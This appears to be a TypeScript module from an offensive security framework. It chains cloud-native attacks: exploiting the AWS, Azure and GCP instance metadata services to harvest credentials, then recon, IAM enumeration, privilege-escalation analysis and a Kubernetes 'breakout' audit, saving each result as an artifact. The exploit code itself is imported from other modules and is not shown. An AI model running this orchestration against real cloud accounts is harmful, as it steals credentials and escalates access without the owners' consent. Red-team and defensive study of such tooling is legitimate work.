/**
 * @module ares/cloud_native
 * Cloud-native attacks — MetadataExploit, AWS/Azure/GCP recon, K8s breakout.
 */
import { MetadataExploit, AWSRecon, AzureRecon, GCPRecon, IAMEnumerator, CloudPrivEsc } from "../cloud.ts"
import { auditCluster } from "../container_k8s.ts"
import { fuseMultiCloudAsm } from "../multi_cloud_asm.ts"
import { AttackSurfaceGraph } from "../attack_surface.ts"
import { liveRequired, writeArtifact } from "./_base.ts"
import { step, type ExecStep } from "./_integrations.ts"

export interface CloudNativeResult {
  platforms: string[]
  steps: ExecStep[]
  artifacts: string[]
  summary: string
}

export async function runCloudNativeAttack(opts: {
  live?: boolean
  tenant?: string
  subscription?: string
}): Promise<CloudNativeResult> {
  liveRequired("ares_cloud_native", opts)
  const platforms: string[] = []
  const steps: ExecStep[] = []
  const artifacts: string[] = []

  const meta = new MetadataExploit({ live: true })
  for (const [name, fn] of [
    ["aws_imds", () => meta.exploitAws()],
    ["azure_imds", () => meta.exploitAzure()],
    ["gcp_imds", () => meta.exploitGcp()],
  ] as const) {
    const r = await fn()
    platforms.push(name)
    const fp = writeArtifact("cloud", `${name}.json`, JSON.stringify(r, null, 2))
    artifacts.push(fp)
    steps.push(step(name, r.accessible || !!r.data, r.error || `${r.credentials.length} cred(s)`))
  }

  const aws = new AWSRecon()
  const awsResult = await aws.enumerateAll()
  platforms.push("aws_recon")
  artifacts.push(writeArtifact("cloud", "aws_recon.json", JSON.stringify(awsResult, null, 2)))
  steps.push(step("aws_recon", !("error" in awsResult && awsResult.error), JSON.stringify(awsResult).slice(0, 300)))

  const azure = new AzureRecon()
  const azResult = await azure.enumerateAll()
  platforms.push("azure_recon")
  artifacts.push(writeArtifact("cloud", "azure_recon.json", JSON.stringify(azResult, null, 2)))
  steps.push(step("azure_recon", !("error" in azResult && azResult.error), JSON.stringify(azResult).slice(0, 300)))

  const gcp = new GCPRecon()
  const gcpResult = await gcp.enumerateAll()
  platforms.push("gcp_recon")
  artifacts.push(writeArtifact("cloud", "gcp_recon.json", JSON.stringify(gcpResult, null, 2)))
  steps.push(step("gcp_recon", !("error" in gcpResult && gcpResult.error), JSON.stringify(gcpResult).slice(0, 300)))

  const iam = new IAMEnumerator()
  const iamResult = await iam.enumerateAll()
  platforms.push("iam_enum")
  artifacts.push(writeArtifact("cloud", "iam_enum.json", JSON.stringify(iamResult, null, 2)))
  steps.push(step("iam_enum", true, JSON.stringify(iamResult).slice(0, 300)))

  const privEsc = new CloudPrivEsc()
  const peResult = {
    aws: await privEsc.analyzeAws(),
    azure: await privEsc.analyzeAzure(opts.subscription),
    gcp: await privEsc.analyzeGcp(),
  }
  platforms.push("cloud_privesc")
  artifacts.push(writeArtifact("cloud", "privesc_paths.json", JSON.stringify(peResult, null, 2)))
  steps.push(step("cloud_privesc", true, JSON.stringify(peResult).slice(0, 300)))

  let k8sStep = step("k8s_audit", false, "skipped — kubectl not available")
  try {
    const k8s = await auditCluster({ live: true, quick: false })
    platforms.push("kubernetes_breakout")
    artifacts.push(writeArtifact("cloud", "k8s_audit.json", JSON.stringify(k8s, null, 2)))
    k8sStep = step("k8s_audit", k8s.findings.length >= 0, `${k8s.findings.length} finding(s)`)
  } catch (err) {
    k8sStep = step("k8s_audit", false, String((err as Error).message).slice(0, 200))
  }
  steps.push(k8sStep)

  const graph = new AttackSurfaceGraph("cloud")
  const fused = await fuseMultiCloudAsm(graph, { live: true, target: "169.254.169.254" })
  platforms.push("multi_cloud_asm")
  steps.push(step("multi_cloud_asm", fused.fusedCount >= 0, `${fused.fusedCount} fused asset(s)`))

  return {
    platforms,
    steps,
    artifacts,
    summary: `Cloud-native: ${platforms.length} platform(s), ${steps.filter((s) => s.success).length}/${steps.length} live probe(s) ok`,
  }
}

export default { runCloudNativeAttack }
